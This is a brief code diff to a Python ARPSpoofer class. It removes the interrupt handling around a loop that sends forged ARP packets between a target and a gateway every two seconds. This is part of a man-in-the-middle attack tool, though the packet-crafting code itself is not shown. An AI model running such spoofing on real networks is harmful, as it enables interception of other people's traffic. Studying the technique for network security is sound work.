@@ -67,19 +67,14 @@ class ARPSpoofer:
         """Start ARP spoofing by constantly sending forged packets between two devices to trick them."""
         sent_packets_count = 0
         self.running = True
-        # TODO: Does it need try now?
-        try:
-            while self.running:
-                spoof(self.target_ip, self.gateway_ip)
-                spoof(self.gateway_ip, self.target_ip)
-                sent_packets_count += 2
-                # NOTE: Remember that while working on threads,
-                # the console output won't be displayed unless in debug mode.
-                print(f"[+] Sending 2 packets regularly... Total packets sent: {sent_packets_count}", end="\r")
-                time.sleep(2)
-        except KeyboardInterrupt:
-            print("\n[+] Execution aborted. Restoring ARP tables...")
-            self.stop()
+        while self.running:
+            spoof(self.target_ip, self.gateway_ip)
+            spoof(self.gateway_ip, self.target_ip)
+            sent_packets_count += 2
+            # NOTE: Remember that while working on threads,
+            # the console output won't be displayed unless in debug mode.
+            print(f"[+] Sending 2 packets regularly... Total packets sent: {sent_packets_count}", end="\r")
+            time.sleep(2)
 
     def stop(self) -> None:
         """Stop ARP spoofing by sending forged packets that will restore network flow to the one before spoofing."""
